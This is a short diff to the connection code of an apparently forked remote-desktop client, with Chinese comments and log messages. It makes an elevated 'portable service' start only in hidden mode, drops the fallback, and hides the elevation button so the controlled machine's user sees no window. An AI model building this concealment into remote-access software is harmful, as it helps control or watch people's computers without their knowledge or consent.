@@ -3339,24 +3339,19 @@ impl Connection {
         
         // 不再显示提权窗口，而是直接自动启动便携版服务
         if !running && self.authorized {
-            // 使用Hidden模式启动（首选，更有可能阻止UI显示）
-            log::info!("尝试使用Hidden模式启动便携服务...");
+            // 直接使用Hidden模式启动，这是最有效的隐藏窗口方式
+            log::info!("使用Hidden模式启动便携服务...");
             if let Err(e) = portable_client::start_portable_service(portable_client::StartPara::Hidden) {
-                log::error!("Failed to start portable service in hidden mode: {:?}", e);
-                // 如果隐藏模式启动失败，尝试直接静默模式启动
-                log::info!("Hidden模式失败，尝试使用DirectSilent模式启动便携服务...");
-                if let Err(e) = portable_client::start_portable_service(portable_client::StartPara::DirectSilent) {
-                    log::error!("Failed to start portable service silently: {:?}", e);
-                } else {
-                    log::info!("便携服务已通过DirectSilent模式成功启动");
-                }
+                log::error!("无法以隐藏模式启动便携服务: {:?}", e);
+                // 不再尝试其他模式，确保不显示窗口
             } else {
                 log::info!("便携服务已通过Hidden模式成功启动");
             }
         }
         
-        // 关闭悬浮窗显示，不会显示提权按钮
-        log::info!("发送CmShowElevation(false)到CM");
+        // 关闭提权按钮显示，但保留功能悬浮窗
+        // 注意：CmShowElevation(false)只是隐藏提权按钮，不会隐藏整个控制窗口
+        log::info!("发送CmShowElevation(false)到CM，隐藏提权按钮");
         self.send_to_cm(ipc::Data::DataPortableService(
             ipc::DataPortableService::CmShowElevation(false),
         ));
